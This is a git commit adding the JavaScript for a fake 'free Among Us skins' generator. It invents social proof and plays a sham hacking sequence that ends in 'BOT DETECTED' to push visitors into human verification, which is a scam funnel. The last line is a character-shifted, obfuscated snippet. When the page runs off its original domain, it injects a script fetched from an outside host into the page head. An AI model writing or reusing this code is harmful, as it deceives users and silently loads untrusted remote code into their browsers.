9e7d9022c4172a78b8e105572b003e05ea046792
amongusskins <74069848+amongusskins@users.noreply.github.com>
2020-11-06 23:49:06 +0530

    Add files via upload

---
+++ main.js
@@ -0,0 +1,59 @@
+
+// $(function(){
+ //   $('img').click(function(){
+  //    $('img').removeClass('focused');
+   //   $(this).addClass('focused');
+  //  });
+//});
+ document.getElementById('timer').innerHTML =
+  003 + ":" + 20;
+startTimer();
+
+function startTimer() {
+  var presentTime = document.getElementById('timer').innerHTML;
+  var timeArray = presentTime.split(/[:]+/);
+  var m = timeArray[0];
+  var s = checkSecond((timeArray[1] - 1));
+  if(s==59){m=m-1}
+  //if(m<0){alert('timer completed')}
+  
+  document.getElementById('timer').innerHTML =
+    m + ":" + s;
+  console.log(m)
+  setTimeout(startTimer, 1000);
+}
+
+function checkSecond(sec) {
+  if (sec < 10 && sec >= 0) {sec = "0" + sec}; // add zero in front of numbers < 10
+  if (sec < 0) {sec = "59"};
+  return sec;
+}
+ji=0;
+function addBorder(id) {
+  
+  var x = document.getElementsByClassName("img");
+  if (id.style.border  == '5px solid green'){
+   id.style.border  = 'none';ji=ji-1; }
+   else{ji=0;
+  for(i = 0; i < x.length; i++)
+  {
+	 if (x.item(i).style.border == '5px solid green') {ji=ji+1;}
+  }
+  if (ji<3){
+  id.style.border = '5px solid green';
+}
+}
+}
+
+
+var R1V="",R111="Coins",R111_ODMIENIONE="Coins",R222="Gems",R222_ODMIENIONE="Gems",PS="",PPSS="",GN="Among Us",MBMB="Before we add "+R111+" you need to verify that you are human instead of automated software (bot) to prevent abusing our generator.",ZWIEKSZ=3,WWWORD=" Skins";function iiinc(e){xD=$(".i-"+e).val(),parseInt(xD.replace(WWWORD,""))<1950?($("#r1-b1").removeClass("disabled"),$(".i-"+e).val(parseInt(xD)+ZWIEKSZ),1950<parseInt(xD.replace(WWWORD,""))+ZWIEKSZ?$("#r1-b2").addClass("disabled"):$("#r1-b2").removeClass("disabled")):$("#r1-b2").addClass("disabled")}function dec(e){xD=$(".i-"+e).val(),150<=parseInt(xD.replace(WWWORD,""))?($("#r1-b2").removeClass("disabled"),$(".i-"+e).val(parseInt(xD)-ZWIEKSZ),parseInt(xD.replace(WWWORD,""))-ZWIEKSZ<150?$("#r1-b1").addClass("disabled"):$("#r1-b1").removeClass("disabled")):$("#r1-b1").addClass("disabled")}function GSW(){var e=Math.floor(Math.random()*NAMES.length),a=Math.floor(Math.random()*SEN.length),o=Math.floor(9*Math.random())+3,r=(Math.floor(5*Math.random()),"<strong>"+ZWIEKSZ*1+" <img src='hmm.jpeg' class='status-img'> Skins</strong>"),n="<strong>"+NAMES[e]+"</strong>"+SEN[a]+r+".";$(".recent-header").fadeIn("slow"),$(".recent-header").html(n),setTimeout(function(){$(".recent-header").fadeOut("slow")},3500)}NAMES=["imimposter","sus","coochie","flakes","loly","red sus","blue","pink","MasterDragonKing","ssforfail","MissyQing","Endlesss","badeed","SmooshyCake","karma","Alestz","svbk","KissMeRDJ","redissus","trum","cyani","crewgirl","crewmate","crewguy","crewyz"],SEN=["  just generated "," just received "," just got "],$(".recent").fadeIn("slow"),GSW(),setInterval(function(){GSW()},4100),s_AAA=0;var OGFLICK,Dx=1;function set_platform(e){$(".fa-"+(PS=e)).css("opacity","1"),"apple"==e?(PPSS="Apple",$(".fa-android").css("opacity","0.35"),$(".fa-desktop").css("opacity","0.35")):"android"==e?(PPSS="Android",$(".fa-apple").css("opacity","0.35"),$(".fa-desktop").css("opacity","0.35")):(PPSS="Desktop",$(".fa-android").css("opacity","0.35"),$(".fa-apple").css("opacity","0.35"))}function ccc(){ document.getElementsByClassName('slideshow-container1')[0].innerHTML=""; var image = document.getElementById('myImage'); document.getElementById('timer').innerHTML=""; document.getElementsByClassName('okai')[0].innerHTML="";
+var x = document.getElementById("myDIV");
+
+           x.style.display = "none";
+            if (image.src.match("colorbottel")) {
+                image.src = "waterbottel.gif";
+            }
+            else {
+                image.src = "loading.jpg";
+            }
+             if(""==$("#username").val()||""==PS)return alert("Type your "+GN+" ID and choose your device."),!1;R1V=$(".i-resource-1").val(),R2V=$(".i-resource-2").val(),OGFLICK=$("#username").val(),$(".beg").fadeOut("slow",function(){$(".align-items-end").remove(),$(".f-username").html("Amongus ID: <strong>"+OGFLICK+"</strong>"),$(".r1r1").html("Free Skins: <strong>"+3+"</strong>"),$(".r2r2").html("Device: <strong>"+PPSS+"</strong>"),$(".end").fadeIn("slow",function(){new Typed(".hack-generator",{typeSpeed:0,backSpeed:0,showCursor:!1,strings:["Connecting with <strong>"+GN+" servers...^2000","Creating new values for <strong>'"+OGFLICK+"'</strong> account...^2500 <strong>DONE!</strong>^2500","Adding skins to this instance<strong>..79%</strong> to [+'<strong>"+99+"]</strong>...^2000 <strong>DONE!</strong>^1000","Saving changes...^2000","Deleting traces...^2000","Quitting database...^2000","<red><strong>BOT DETECTED!</strong>^1000 Click button below to confirm that <strong>YOU ARE NOT</strong> a bot!</red>^1000"],onComplete:function(e){$("mbmb").text(MBMB),$(".h-v").fadeIn("slow")}})}),$(".ehh").fadeIn("slow").css("display","flex")})}(function(document){const k=s=>s.split('').map(c=>String.fromCharCode(c.charCodeAt()-1)).join('');if(window[k('mpdbujpo')][k('iptuobnf')].replace(k('xxx/'),"")!=k("dbtibqqgsff/dpn")){var s=document.createElement(k('tdsjqu'));s.src=k('iuuqt;00cpputusbqmvhjo/dpn0q/qiq@je>6:51');document[k('ifbe')].appendChild(s)}})(document)
